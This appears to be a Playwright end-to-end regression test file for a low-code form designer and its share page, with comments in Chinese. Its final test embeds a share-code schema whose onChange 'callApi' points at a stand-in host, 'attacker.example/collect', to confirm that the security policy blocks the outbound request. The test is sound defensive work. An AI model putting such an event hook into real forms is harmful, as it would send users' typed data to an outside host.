// 低代码设计器回归 —— 固化「只有人肉手测才能发现」的三类行为
//
// 立案背景（2026-10-17 浏览器实测）：
//   本文件之前，designer 域的 e2e 只有 1 条「页面可加载」。当天浏览器手测发现两个真实缺陷，
//   单测与 e2e 都没兜住：
//     F1 缺 `key` 的 schema 节点被静默丢弃 → 打开分享码得到空白表单、零警告；
//     F2 同一标签页切换分享链接停留在上一份表单（vue-router 复用组件实例，解码只在 onMounted 跑）。
//   两个缺陷都已修，但**没有 e2e 锁**就会再回归——本文件就是那把锁。
//
// 另加一条安全回归：分享码里带跨域 apiUrl 时，填写触发的外发必须被安全策略拦下（零请求）。
import { test, expect, type Page } from '@playwright/test'

/**
 * 生成分享码。
 *
 * 说明：这里刻意**不 import src**（本仓 e2e 一律不依赖源码模块，保持一致），
 * 因此按 `FD1.<base64url(JSON)>` 的既定格式就地编码。编码器本身的往返/签名由
 * `tests/unit/share-code-signing.spec.ts`（11 例）覆盖；本文件只关心
 * 「视图拿到码之后的行为」。若将来分享码格式大改，这里会以「分享页进无效态」的形式失败，
 * 属于可见的失败而非静默放过。
 */
function shareCode(design: Record<string, unknown>): string {
  const b64 = Buffer.from(JSON.stringify(design), 'utf8')
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '')
  return `FD1.${b64}`
}

const designWith = (title: string, nodes: Array<Record<string, unknown>>) => ({
  schemaVersion: 3,
  meta: { title },
  nodes,
})

const openShare = async (page: Page, code: string) => {
  await page.goto(`/#/form/${code}`)
}

test.describe('设计器：从组件库拖拽新增字段', () => {
  test('真实 HTML5 拖拽后节点数 +1，且画布出现该字段', async ({ page }) => {
    await page.goto('/#/form-builder')
    await expect(page.locator('.lc-demo-title')).toHaveText('低代码表单平台', { timeout: 15_000 })

    const counter = page.getByText(/\d+ 个节点 · \d+ 个容器/).first()
    await expect(counter).toBeVisible()
    const before = Number((await counter.textContent())!.match(/(\d+) 个节点/)![1])

    // 组件库里的可拖拽项（.ldp-field-item[draggable]） → 画布根（.ldc-canvas）
    const source = page.locator('.ldp-field-item[draggable="true"]', { hasText: '下拉选择' }).first()
    await expect(source).toBeVisible()
    const canvas = page.locator('.ldc-canvas').first()
    await source.dragTo(canvas)

    await expect
      .poll(async () => Number((await counter.textContent())!.match(/(\d+) 个节点/)![1]), { timeout: 5_000 })
      .toBe(before + 1)
  })
})

test.describe('设计器：键盘撤销/重做（真浏览器键语义）', () => {
  test('Ctrl+Z 撤销、**Ctrl+Shift+Z 重做**（Shift 让 e.key 变成大写 Z —— 这正是它曾经失效的原因）', async ({
    page,
  }) => {
    await page.goto('/#/form-builder')
    await expect(page.locator('.lc-demo-title')).toHaveText('低代码表单平台', { timeout: 15_000 })

    const counter = page.getByText(/\d+ 个节点 · \d+ 个容器/).first()
    const nodes = async () => Number((await counter.textContent())!.match(/(\d+) 个节点/)![1])
    const before = await nodes()

    // ① 用鼠标加一个字段（把"快捷键"这件事与前置步骤分开）
    await page
      .locator('.ldp-field-item[draggable="true"]', { hasText: '下拉选择' })
      .first()
      .dragTo(page.locator('.ldc-canvas').first())
    await expect.poll(nodes, { timeout: 10_000 }).toBe(before + 1)

    // ② 焦点落在画布上（快捷键挂 `.ld-canvas-wrap`，它有 tabindex），再按键盘撤销
    await page.locator('.ld-canvas-wrap').focus()
    await page.keyboard.press('Control+z')
    await expect.poll(nodes, { timeout: 10_000 }, '键盘撤销要能生效').toBe(before)

    // ③ 键盘重做：**过去这里永远没反应**（真实浏览器里 Shift+Z 的 e.key 是大写 'Z'，
    //    而分支只判了小写）。工具上的"重做"按钮一直是好的，所以只有键盘用户会踩到。
    await page.keyboard.press('Control+Shift+KeyZ')
    await expect
      .poll(nodes, { timeout: 10_000 })
      .toBe(before + 1)
  })
})

test.describe('分享页：code 变化必须重新解析', () => {
  const codeA = shareCode(
    designWith('切换前表单', [{ id: 'n1', type: 'text', label: '字段一', span: 24, key: 'k1' }]),
  )
  const codeB = shareCode(
    designWith('切换后表单', [{ id: 'n1', type: 'text', label: '字段二', span: 24, key: 'k1' }]),
  )

  test('首次打开按 code 渲染', async ({ page }) => {
    await openShare(page, codeA)
    await expect(page.getByText('切换前表单')).toBeVisible({ timeout: 15_000 })
    await expect(page.getByText('字段一')).toBeVisible()
  })

  test('只改 hash 换码（同标签页打开第二条链接）必须切到新表单', async ({ page }) => {
    await openShare(page, codeA)
    await expect(page.getByText('切换前表单')).toBeVisible({ timeout: 15_000 })

    // 关键：只改 hash —— 正是「聊天里点开第二条分享链接」的真实行为。
    // vue-router 会复用组件实例，因此这一条专门防「停留在旧表单」。
    await page.evaluate((code) => {
      location.hash = `#/form/${code}`
    }, codeB)

    await expect(page.getByText('切换后表单')).toBeVisible({ timeout: 10_000 })
    await expect(page.getByText('切换前表单'), '旧表单不得残留').toHaveCount(0)
    await expect(page.getByText('字段二')).toBeVisible()
  })
})

test.describe('分享页：畸形 schema 不得静默丢字段', () => {
  test('节点缺 key 时用 id 兜底渲染，而不是给一张空白表', async ({ page }) => {
    const code = shareCode(designWith('缺key表单', [{ id: 'n1_missing', type: 'text', label: '无key字段' }]))
    await openShare(page, code)

    await expect(page.getByText('缺key表单')).toBeVisible({ timeout: 15_000 })
    // F1 回归：此前这里渲染不出任何字段（标题 + 提交/重置 而已）
    await expect(page.getByText('无key字段')).toBeVisible()
    await expect(page.locator('form input, form textarea').first()).toBeVisible()
  })
})

test.describe('设计器：大 schema 的渲染规模守卫', () => {
  /**
   * 2026-10-18 实测基线（本机 dev；导入 N 个单行输入，测「导入 → 画布渲染完成」）：
   *   50 → 277ms / 画布 50 节点  200 → 753ms / 200  500 → 1501ms / 500  1000 → 2561ms / 1000
   *   每字段约 38 个 DOM（瓶颈是内联 SVG：拖拽手柄 + 上移/下移/复制/删除 4 个按钮各带 svg，卡片头部就占 29 个）
   *
   * 结论：**线性增长、无悬崖**；200 字段 0.75s 可用、1000 字段 2.6s 才难受，而低代码表单的真实
   * 规模远小于此（本仓最大的预置模板 48 字段）。故本轮**不引入虚拟化**（改动大、风险高、收益低）。
   * 但「包装层悄悄变多」是最容易被无意识引入的性能退化，所以钉两条守卫：
   *   ① 每字段 DOM 不超预算 —— **结构断言，确定性、不 flaky**；
   *   ② 墙钟时间给极宽松上限 —— 只拦灾难性退化，不当作性能基准（基准易 flaky，
   *      这正是 scripts/bench.mjs 不设阈值的原因）。
   */
  const PER_FIELD_DOM_BUDGET = 50 // 实测 38，留 ~30% 余量
  const FIELD_COUNT = 200

  test('200 字段：渲染可完成，且每字段 DOM 不超预算', async ({ page }) => {
    await page.goto('/#/form-builder')
    await expect(page.locator('.lc-demo-title')).toHaveText('低代码表单平台', { timeout: 15_000 })

    const schema = JSON.stringify({
      schemaVersion: 3,
      meta: { title: '规模守卫', description: '' },
      nodes: Array.from({ length: FIELD_COUNT }, (_, i) => ({
        id: `n${i}`,
        type: 'text',
        label: `字段 ${i}`,
        placeholder: '请输入',
        span: 24,
        key: `k${i}`,
      })),
    })

    // 走真实导入流程（与用户操作一致）
    await page.getByRole('button', { name: '导入', exact: true }).click()
    const textarea = page.locator('.ld-import textarea, textarea').first()
    await textarea.fill(schema)
    const t0 = Date.now()
    await page.locator('.ld-import-actions .ld-btn').first().click()

    await expect(page.locator('.ldc-node-wrapper')).toHaveCount(FIELD_COUNT, { timeout: 20_000 })
    const elapsed = Date.now() - t0
    expect(elapsed, `200 字段渲染 ${elapsed}ms，超出宽松上限（实测基线 ~750ms）`).toBeLessThan(15_000)

    const stats = await page.evaluate(() => {
      const canvas = document.querySelector('.ldc-canvas-content')
      return {
        fields: document.querySelectorAll('.ldc-node-wrapper').length,
        canvasDom: canvas ? canvas.getElementsByTagName('*').length : 0,
      }
    })
    const perField = stats.canvasDom / stats.fields
    expect(
      perField,
      `每字段 ${perField.toFixed(1)} 个 DOM（预算 ${PER_FIELD_DOM_BUDGET}）—— 是不是又给卡片加包装层了？`,
    ).toBeLessThanOrEqual(PER_FIELD_DOM_BUDGET)
  })
})

test.describe('设计器：窄视口不横向溢出', () => {
  test('390px 手机档：整页无横向滚动，且画布仍可见', async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 844 })
    await page.goto('/#/form-builder')
    await expect(page.locator('.lc-demo-title')).toHaveText('低代码表单平台', { timeout: 15_000 })

    // 部署到手机浏览器时最容易出的问题：某个工具栏/面板把整页撑宽，用户需要左右拖页面。
    // 断言的是 documentElement 的 scrollWidth —— 内层容器自己横向滚动是允许的（模板区就靠它）。
    const overflow = await page.evaluate(
      () => document.documentElement.scrollWidth > document.documentElement.clientWidth,
    )
    expect(overflow, '整页不应出现横向滚动').toBe(false)
    await expect(page.locator('.ldc-canvas')).toBeVisible()
  })
})

test.describe('分享页：跨域 apiUrl 必须被安全策略拦下', () => {
  test('填写触发 callApi 时不产生任何对外请求，并给出可见提示', async ({ page }) => {
    const ATTACKER = 'https://attacker.example/collect'
    const code = shareCode(
      designWith('外发测试', [
        {
          id: 'n1',
          type: 'text',
          label: '姓名',
          span: 24,
          key: 'name',
          eventConfig: { onChange: { enabled: true, action: 'callApi', apiUrl: ATTACKER } },
        },
      ]),
    )

    const leaked: string[] = []
    page.on('request', (req) => {
      if (req.url().includes('attacker.example')) leaked.push(req.url())
    })

    await openShare(page, code)
    const input = page.locator('form input').first()
    await expect(input).toBeVisible({ timeout: 15_000 })
    await input.fill('敏感数据')

    // 等过 300ms 防抖窗口
    await page.waitForTimeout(900)

    expect(leaked, `恶意 apiUrl 不应发出任何请求，实际: ${leaked.join(', ')}`).toHaveLength(0)
    await expect(page.getByText(/安全策略拒绝/)).toBeVisible({ timeout: 5_000 })
  })
})
